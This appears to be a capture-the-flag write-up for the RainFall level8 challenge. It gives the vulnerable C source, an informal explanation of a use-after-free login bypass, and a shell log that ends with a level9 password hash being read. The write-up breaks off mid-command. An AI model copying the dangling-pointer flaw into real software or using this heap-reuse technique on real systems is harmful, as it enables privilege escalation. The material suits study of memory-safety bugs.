@@ -1,0 +1,114 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdbool.h>
+
+struct auth_t {
+    char name[32];
+    int authenticated;
+};
+
+struct auth_t *auth = NULL;
+char *service = NULL;
+
+int main(void) {
+    char input[128];
+
+    while (true) {
+        printf("%p, %p \n", (void *)auth, (void *)service);
+
+        if (fgets(input, sizeof(input), stdin) == NULL) {
+            return 0;
+        }
+
+        if (strncmp(input, "auth ", 5) == 0) {
+            auth = malloc(sizeof(struct auth_t));
+            if (auth != NULL) {
+                memset(auth, 0, sizeof(struct auth_t));
+                
+                if (strlen(input + 5) < 31) {
+                    strcpy(auth->name, input + 5);
+                }
+            }
+        }
+
+        if (strncmp(input, "reset", 5) == 0) {
+            free(auth);
+        }
+
+        if (strncmp(input, "service", 7) == 0) {
+            service = strdup(input + 7);
+        }
+
+        if (strncmp(input, "login", 5) == 0) {
+            if (auth != NULL && auth->authenticated != 0) {
+                system("/bin/sh");
+            } else {
+                fwrite("Password:\n", 1, 10, stdout);
+            }
+        }
+    }
+    return 0;
+}
+
+
+if we analyze the code this is one of the most easiest exercises, this excercise goes about learning why the free and clear after it matters,
+
+we got tree commands, auth 'name', service 'something else', and reset, now 
+the auth basicly is doing an allocation
+then is doing a clearence to set the memory to zero, this is good but not enough
+
+now here is a catch we cannot put more than 32 chars that we need in order to write the int in the structure, so we need to do somethin else,
+
+lets take a look into service and what is doing
+
+this function only dup the tring into the heap, without the service word, so lets search somithng more uefull
+
+the reset function just read reset and do a free of the auth pointer, now here is the key, the reset is ont cleaning the input to zero, is just flagging the auth old pointer to null, and even if it would set to zero all the cleaned memory it is not updating the pointer in the variable, it keeps in the same spot
+so
+lets use that, to bypass the login check
+
+first we just put an auth so it saves in the heap the struct
+
+then we clear the auth so the heap flags the auth old memory chunk as allocatable again
+
+then we allocate that and fill it with the service
+and yeah that is all 
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+reset
+0x804a008, (nil) 
+serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+0x804a008, 0x804a018 
+0x804a008, 0x804a018 
+login
+$ ls
+ls: cannot open directory .: Permission denied
+$ cd ..
+$ ls
+ls: cannot open directory .: Permission denied
+$ cd ..
+$ ls
+ls: cannot open directory .: Permission denied
+$ cat /home/level9/.pass
+cat: /home/level9/.pass: No such file or directory
+$ pwd
+/home
+$ whoami
+level9
+$ cd level9
+/bin/sh: 9: cd: can't cd to level9
+$ ls
+ls: cannot open directory .: Permission denied
+$ cat ~/.pass
+cat: /home/user/level8/.pass: Permission denied
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+python -c 'print "
